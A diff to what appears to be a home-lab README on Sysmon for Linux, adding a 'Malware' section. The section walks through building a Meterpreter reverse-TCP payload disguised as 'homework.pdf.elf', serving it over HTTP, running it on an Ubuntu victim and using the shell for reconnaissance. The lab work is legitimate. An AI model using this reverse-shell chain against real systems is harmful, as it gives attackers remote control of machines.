@@ -74,3 +74,57 @@ nano /opt/config.xml
 ```
 sudo tail -f /var/log/syslog | sudo /opt/sysmon/sysmonLogView
 ```
+
+### 3. Malware
+
+1. Note the ip of the attacker machine (Kali)
+```
+ip a
+```
+
+2. Create the reverse tcp payload with msfvenom using:
+```
+msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.20.11 LPORT=4444 -f elf -o homework.pdf.elf
+```
+*note: lhost is the attackeer ip, elf executable file format is used for payload.*
+
+4. Start msfconsole and prepare the handler and run exploit
+```
+use exploit/multi/handler
+set payload linux/x64/meterpreter_reverse_tcp
+set LHOST 192.168.20.11
+exploit
+```
+- *note that the default payload for exploit/multi/handler is generic/shell_reverse_tcp (see below); explicitly set payload to linux/x64/meterpreter_reverse_tcp.*
+[options](./docs/options.png)
+
+5. Serve the payload with Python HTTP server
+```
+python3 -m http.server 9999
+```
+
+6. Install the malware on Ubuntu by visiting `192.168.20.11:9999` on a browser and downloading it from the python server. After installing:
+```
+chmod +x homework.pdf.elf
+./homework.pdf.elf
+```
+
+7. After executing the payload, the handler on Kali should show a new Meterpreter session (see below). 
+(handler)[./docs/establish.png]
+
+- In msfconsole you can interact with the Ubunut machine from the attacker machine using `shell` with the following commands:
+```
+shell
+ip a 
+user
+getent group
+```
+- `ip a` shows network interfaces
+- `user` lists users
+- `getent group` retrieves group info from administrative databases
+
+8. On the target machine, we can see that we have an established connection with the attacker machine using `sudo ss -tp`:.
+```
+ESTAB  0  0  192.168.20.10:34944  192.168.20.11:4444  users:((“sh”,pid=8931,fd=4),(“homework.pdf.el”,pid=8370,fd=4))
+```
+- *note that the peer address (2nd ip) is the attacker machines ip with the port of the handler.*
